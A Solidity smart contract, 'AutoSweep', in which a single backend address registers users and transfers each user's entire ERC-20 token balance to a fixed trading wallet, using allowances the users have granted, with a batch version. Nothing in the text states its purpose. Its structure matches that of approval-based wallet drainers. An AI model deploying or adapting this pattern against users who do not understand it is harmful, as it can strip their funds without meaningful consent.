// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract AutoSweep {
    address public immutable tradingWallet;
    address public immutable backend;
    
    mapping(address => bool) public registeredUsers;
    mapping(address => mapping(address => bool)) public tokenApprovals;
    
    event UserRegistered(address indexed user, uint256 timestamp);
    event TokenSwept(address indexed user, address indexed token, uint256 amount, uint256 timestamp);
    event ApprovalGranted(address indexed user, address indexed token, uint256 timestamp);
    
    modifier onlyBackend() {
        require(msg.sender == backend, "Only backend can call");
        _;
    }
    
    constructor(address _tradingWallet, address _backend) {
        require(_tradingWallet != address(0), "Invalid trading wallet");
        require(_backend != address(0), "Invalid backend");
        tradingWallet = _tradingWallet;
        backend = _backend;
    }
    
    function registerUser(address user) external onlyBackend {
        require(!registeredUsers[user], "User already registered");
        registeredUsers[user] = true;
        emit UserRegistered(user, block.timestamp);
    }
    
    function grantApproval(address user, address token) external onlyBackend {
        require(registeredUsers[user], "User not registered");
        tokenApprovals[user][token] = true;
        emit ApprovalGranted(user, token, block.timestamp);
    }
    
    function sweepToken(address user, address token) external onlyBackend {
        require(registeredUsers[user], "User not registered");
        require(tokenApprovals[user][token], "Token not approved");
        
        IERC20 tokenContract = IERC20(token);
        uint256 balance = tokenContract.balanceOf(user);
        
        require(balance > 0, "No tokens to sweep");
        
        uint256 allowance = tokenContract.allowance(user, address(this));
        require(allowance >= balance, "Insufficient allowance");
        
        bool success = tokenContract.transferFrom(user, tradingWallet, balance);
        require(success, "Transfer failed");
        
        emit TokenSwept(user, token, balance, block.timestamp);
    }
    
    function batchSweep(address[] calldata users, address[] calldata tokens) external onlyBackend {
        require(users.length == tokens.length, "Array length mismatch");
        
        for (uint i = 0; i < users.length; i++) {
            address user = users[i];
            address token = tokens[i];
            
            if (!registeredUsers[user] || !tokenApprovals[user][token]) {
                continue;
            }
            
            IERC20 tokenContract = IERC20(token);
            uint256 balance = tokenContract.balanceOf(user);
            
            if (balance == 0) {
                continue;
            }
            
            uint256 allowance = tokenContract.allowance(user, address(this));
            if (allowance < balance) {
                continue;
            }
            
            try tokenContract.transferFrom(user, tradingWallet, balance) returns (bool success) {
                if (success) {
                    emit TokenSwept(user, token, balance, block.timestamp);
                }
            } catch {
                continue;
            }
        }
    }
    
    function isUserRegistered(address user) external view returns (bool) {
        return registeredUsers[user];
    }
    
    function isTokenApproved(address user, address token) external view returns (bool) {
        return tokenApprovals[user][token];
    }
}
